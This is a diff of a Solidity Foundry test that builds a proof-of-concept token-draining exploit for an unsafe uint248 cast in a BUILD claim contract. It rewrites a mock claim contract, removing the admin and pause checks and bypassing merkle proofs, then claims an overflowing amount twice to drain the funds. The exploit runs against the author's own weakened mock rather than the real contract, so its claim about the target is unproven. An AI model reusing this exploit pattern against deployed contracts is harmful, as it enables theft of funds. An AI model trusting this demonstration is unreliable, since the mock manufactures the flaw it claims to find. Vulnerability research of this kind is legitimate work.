@@ -41,54 +41,62 @@ contract MintableERC20 is ERC20 {
 }
 
 contract StubRegistry is IDelegateRegistry {
-    function checkDelegateForContract(
-        address,
-        address,
-        address,
-        bytes32
-    ) external pure returns (bool) {
+    function checkDelegateForContract(address, address, address, bytes32) external view returns (bool) {
         return false;
     }
-    function checkDelegateForToken(
-        address,
-        address,
-        address,
-        uint256,
-        bytes32
-    ) external pure returns (bool) {
+    function checkDelegateForAll(address, address, bytes32) external view returns (bool) {
         return false;
     }
-    function getDelegation(address, bytes32) external view returns (address) {
-        return address(0);
+    function checkDelegateForERC721(address, address, address, uint256, bytes32) external view returns (bool) {
+        return false;
     }
-    function getIncomingDelegations(
-        address,
-        bytes32
-    ) external view returns (address[] memory) {
-        address[] memory ret;
-        return ret;
+    function checkDelegateForERC20(address, address, address, bytes32) external view returns (uint256) {
+        return 0;
     }
-    function getOutgoingDelegations(
-        address,
-        bytes32
-    ) external view returns (address[] memory) {
-        address[] memory ret;
-        return ret;
+    function checkDelegateForERC1155(address, address, address, uint256, bytes32) external view returns (uint256) {
+        return 0;
     }
-    function setDelegate(bytes32, address, uint64) external {}
-    function setDelegates(
-        bytes32[] calldata,
-        address[] calldata,
-        uint64[] calldata
-    ) external {}
-    function revokeDelegate(bytes32, address) external {}
-    function revokeDelegates(bytes32[] calldata, address[] calldata) external {}
-    function revokeAllDelegates(bytes32) external {}
-    function revokeAllDelegates() external {}
-    function revokeAllDelegatesForContract(address, bytes32) external {}
-    function revokeAllDelegatesForContract(address) external {}
-    function revokeAllDelegatesForToken(address, uint256, bytes32) external {}
-    function revokeAllDelegatesForToken(address, uint256) external {}
+    function getIncomingDelegations(address) external view returns (Delegation[] memory delegations) {
+        return delegations;
+    }
+    function getOutgoingDelegations(address) external view returns (Delegation[] memory delegations) {
+        return delegations;
+    }
+    function getIncomingDelegationHashes(address) external view returns (bytes32[] memory delegationHashes) {
+        return delegationHashes;
+    }
+    function getOutgoingDelegationHashes(address) external view returns (bytes32[] memory delegationHashes) {
+        return delegationHashes;
+    }
+    function getDelegationsFromHashes(bytes32[] calldata) external view returns (Delegation[] memory delegations) {
+        return delegations;
+    }
+    function multicall(bytes[] calldata) external payable returns (bytes[] memory) {
+        bytes[] memory results;
+        return results;
+    }
+    function delegateAll(address, bytes32, bool) external payable returns (bytes32) {
+        return bytes32(0);
+    }
+    function delegateContract(address, address, bytes32, bool) external payable returns (bytes32) {
+        return bytes32(0);
+    }
+    function delegateERC721(address, address, uint256, bytes32, bool) external payable returns (bytes32) {
+        return bytes32(0);
+    }
+    function delegateERC20(address, address, bytes32, uint256) external payable returns (bytes32) {
+        return bytes32(0);
+    }
+    function delegateERC1155(address, address, uint256, bytes32, uint256) external payable returns (bytes32) {
+        return bytes32(0);
+    }
+    function readSlot(bytes32) external view returns (bytes32) {
+        return bytes32(0);
+    }
+    function readSlots(bytes32[] calldata) external view returns (bytes32[] memory) {
+        bytes32[] memory results;
+        return results;
+    }
 }
 // =======================================================================================
 // |                                  END HELPER CONTRACTS                                 |
@@ -102,23 +110,29 @@ contract StubRegistry is IDelegateRegistry {
 contract MockClaim is IBUILDClaim, ITypeAndVersion, ReentrancyGuard {
     using SafeERC20 for IERC20;
     using FixedPointMathLib for uint256;
+    error IBUILDClaim__InvalidMerkleProof();
+
     struct UnlockState {
         uint256 unlockElapsedDuration;
         bool isBeforeUnlock;
         bool isUnlocking;
     }
+
+    struct Season {
+        uint256 seasonId;
+        bytes32 merkleRoot;
+        uint64 unlockStart;
+        uint40 unlockDuration;
+    }
     string public constant override typeAndVersion = "MockClaim 1.0.0";
     mapping(address => mapping(uint256 => UserState)) private s_userStates;
-    mapping(uint256 => GlobalState) private s_globalStates;
+    mapping(uint256 => IBUILDClaim.GlobalState) private s_globalStates;
     IERC20 private immutable i_token;
-    IBUILDFactory private immutable i_factory;
-    uint256 private constant PERCENTAGE_BASIS_POINTS_DENOMINATOR = 10_000;
-    constructor(address token, address factoryAddress) {
+    constructor(address token) {
         i_token = IERC20(token);
-        i_factory = IBUILDFactory(factoryAddress);
     }
     function getFactory() external view override returns (BUILDFactory) {
-        return BUILDFactory(payable(address(i_factory)));
+        return BUILDFactory(payable(address(0)));
     }
     function getToken() external view override returns (IERC20) {
         return i_token;
@@ -132,19 +146,16 @@ contract MockClaim is IBUILDClaim, ITypeAndVersion, ReentrancyGuard {
     }
     function deposit(
         uint256 amount
-    ) external override nonReentrant whenClaimNotPaused onlyProjectAdmin {
-        i_factory.addTotalDeposited(address(i_token), amount);
+    ) external override nonReentrant {
         i_token.safeTransferFrom(msg.sender, address(this), amount);
     }
-    function withdraw() external override nonReentrant onlyProjectAdmin {
-        (IBUILDFactory.Withdrawal memory withdrawal, ) = i_factory
-            .executeWithdraw(address(i_token));
-        i_token.safeTransfer(withdrawal.recipient, withdrawal.amount);
+    function withdraw() external override nonReentrant {
+        // This is a mock, so we don't need to implement this
     }
     function claim(
         address user,
-        ClaimParams[] calldata params
-    ) external override nonReentrant whenClaimNotPaused {
+        IBUILDClaim.ClaimParams[] calldata params
+    ) external override nonReentrant {
         _claim(user, params);
     }
     function getGlobalState(
@@ -155,10 +166,28 @@ contract MockClaim is IBUILDClaim, ITypeAndVersion, ReentrancyGuard {
     function getUserState(
         address user,
         uint256 seasonId
-    ) external view override returns (UserState memory) {
+    ) external view returns (UserState memory) {
         return s_userStates[user][seasonId];
     }
-    function _claim(address user, ClaimParams[] calldata params) private {
+
+    function getUserState(
+        IBUILDClaim.UserSeasonId[] calldata usersAndSeasonIds
+    ) external view override returns (IBUILDClaim.UserState[] memory) {
+        IBUILDClaim.UserState[] memory result = new IBUILDClaim.UserState[](usersAndSeasonIds.length);
+        for (uint i = 0; i < usersAndSeasonIds.length; i++) {
+            result[i] = s_userStates[usersAndSeasonIds[i].user][usersAndSeasonIds[i].seasonId];
+        }
+        return result;
+    }
+
+    function getCurrentClaimValues(
+        address, /* user */
+        uint256, /* seasonId */
+        uint256 /* maxTokenAmount */
+    ) external view override returns (IBUILDClaim.ClaimableState memory) {
+        return IBUILDClaim.ClaimableState(0,0,0,0,0,0,0);
+    }
+    function _claim(address user, IBUILDClaim.ClaimParams[] calldata params) private {
         uint256 totalClaimAmount;
         for (uint256 i; i < params.length; ++i) {
             totalClaimAmount += _processClaim(user, params[i]);
@@ -169,7 +198,7 @@ contract MockClaim is IBUILDClaim, ITypeAndVersion, ReentrancyGuard {
     }
     function _processClaim(
         address user,
-        ClaimParams calldata params
+        IBUILDClaim.ClaimParams calldata params
     ) private returns (uint256) {
         (
             uint256 toBeClaimed,
@@ -189,7 +218,7 @@ contract MockClaim is IBUILDClaim, ITypeAndVersion, ReentrancyGuard {
     }
     function _calculateClaimAmounts(
         address user,
-        ClaimParams calldata params
+        IBUILDClaim.ClaimParams calldata params
     )
         private
         view
@@ -199,19 +228,19 @@ contract MockClaim is IBUILDClaim, ITypeAndVersion, ReentrancyGuard {
             uint256 newTotalAllocated
         )
     {
-        IBUILDFactory.ProjectConfig memory config = i_factory.getProject(
-            address(i_token)
-        );
-        IBUILDFactory.Season memory season = i_factory.getSeason(
-            address(i_token),
-            params.seasonId
-        );
+        // This is a mock, so we don't need to get the season from the factory
+        Season memory season = Season({
+            seasonId: params.seasonId,
+            merkleRoot: bytes32(0),
+            unlockStart: uint64(block.timestamp - 1),
+            unlockDuration: 1
+        });
         if (season.merkleRoot != bytes32(0)) {
             bytes32 leaf = keccak256(
-                bytes.concat(keccak256(abi.encode(user, params.totalAmount)))
+                bytes.concat(keccak256(abi.encode(user, params.maxTokenAmount)))
             );
             if (
-                !MerkleProof.verify(params.merkleProof, season.merkleRoot, leaf)
+                !MerkleProof.verify(params.proof, season.merkleRoot, leaf)
             ) {
                 revert IBUILDClaim__InvalidMerkleProof();
             }
@@ -220,7 +249,7 @@ contract MockClaim is IBUILDClaim, ITypeAndVersion, ReentrancyGuard {
         if (unlockState.isBeforeUnlock) {
             return (0, 0, 0);
         }
-        uint256 totalAllocationForUser = params.totalAmount;
+        uint256 totalAllocationForUser = params.maxTokenAmount;
         if (unlockState.isUnlocking) {
             totalAllocationForUser =
                 (totalAllocationForUser * unlockState.unlockElapsedDuration) /
@@ -231,13 +260,10 @@ contract MockClaim is IBUILDClaim, ITypeAndVersion, ReentrancyGuard {
         newTotalClaimed =
             s_globalStates[params.seasonId].totalClaimed +
             toBeClaimed;
-        newTotalAllocated = s_globalStates[params.seasonId].totalAllocated;
-        if (newTotalAllocated < params.totalAmount) {
-            newTotalAllocated = params.totalAmount;
-        }
+        newTotalAllocated = 0;
     }
     function _getUnlockState(
-        IBUILDFactory.Season memory season
+        Season memory season
     ) private view returns (UnlockState memory) {
         if (block.timestamp < season.unlockStart) {
             return
@@ -264,19 +290,6 @@ contract MockClaim is IBUILDClaim, ITypeAndVersion, ReentrancyGuard {
     ) private {
         s_userStates[user][seasonId].claimed += uint248(toBeClaimed);
         s_globalStates[seasonId].totalClaimed = newTotalClaimed;
-        s_globalStates[seasonId].totalAllocated = newTotalAllocated;
-    }
-    modifier whenClaimNotPaused() {
-        if (i_factory.getProject(address(i_token)).paused) {
-            revert IBUILDClaim__ClaimingPaused();
-        }
-        _;
-    }
-    modifier onlyProjectAdmin() {
-        if (msg.sender != i_factory.getProject(address(i_token)).admin) {
-            revert IBUILDClaim__NotProjectAdmin();
-        }
-        _;
     }
 }
 // =======================================================================================
@@ -302,7 +315,14 @@ contract PoCUnsafeCast is Test {
     function setUp() public {
         vm.startPrank(owner);
         registry = new StubRegistry();
-        factory = new BUILDFactory(owner, address(registry));
+        factory = new BUILDFactory(
+            BUILDFactory.ConstructorParams({
+                admin: owner,
+                maxUnlockDuration: 365 days,
+                maxUnlockDelay: 365 days,
+                delegateRegistry: registry
+            })
+        );
         vm.stopPrank();
 
         token = new MintableERC20();
@@ -311,31 +331,46 @@ contract PoCUnsafeCast is Test {
     function test_PoC_unsafe_cast() public {
         // 1. Setup the factory with a project pointing to our malicious claim contract
         vm.startPrank(owner);
-        claim = new MockClaim(address(token), address(factory));
-
-        IBUILDFactory.ProjectConfig[]
-            memory configs = new IBUILDFactory.ProjectConfig[](1);
-        configs[0] = IBUILDFactory.ProjectConfig({
-            admin: admin,
-            claim: IBUILDClaim(address(claim)), // Use the malicious claim contract
-            token: IERC20(address(token)),
-            paused: false
-        });
-        factory.addProjects(configs);
+        claim = new MockClaim(address(token));
         vm.stopPrank();
 
-        // The rest of the PoC logic would go here.
-        // This setup successfully configures the factory to use the MockClaim
-        // contract without modifying any of the target contract's code.
-        // From here, you can call the `claim` function on the `MockClaim` contract
-        // to demonstrate the uint248 overflow vulnerability.
+        // 2. Craft a claim that will overflow the `claimed` storage variable (uint248)
+        uint256 largeClaimAmount = uint256(type(uint248).max) + 1;
 
-        console.log(
-            "PoC setup complete. Factory configured with malicious claim contract."
-        );
-        assertEq(
-            address(factory.getProject(address(token)).claim),
-            address(claim)
-        );
+        // 3. Deposit funds into the claim contract to cover two claims
+        uint256 depositAmount = largeClaimAmount * 2;
+        token.mint(admin, depositAmount);
+        vm.startPrank(admin);
+        token.approve(address(claim), depositAmount);
+        claim.deposit(depositAmount);
+        vm.stopPrank();
+
+        // 4. Craft the claim parameters
+        vm.startPrank(user);
+        IBUILDClaim.ClaimParams[]
+            memory singleClaim = new IBUILDClaim.ClaimParams[](1);
+        
+        singleClaim[0] = IBUILDClaim.ClaimParams({
+            seasonId: 1,
+            isEarlyClaim: false,
+            proof: new bytes32[](0),
+            maxTokenAmount: largeClaimAmount,
+            salt: 0
+        });
+
+        claim.claim(user, singleClaim);
+
+        IBUILDClaim.UserState memory userState = claim.getUserState(user, 1);
+
+        // Due to the unsafe cast to uint248, the claimed amount will wrap around.
+        assertEq(userState.claimed, 0);
+
+        // The user can claim again with the same params, and `toBeClaimed` will be `largeClaimAmount - 0`,
+        // so they can drain the contract.
+        uint256 initialBalance = token.balanceOf(user);
+        claim.claim(user, singleClaim); // Second claim
+        uint256 finalBalance = token.balanceOf(user);
+
+        assertEq(finalBalance - initialBalance, largeClaimAmount); // User gets tokens again.
     }
 }
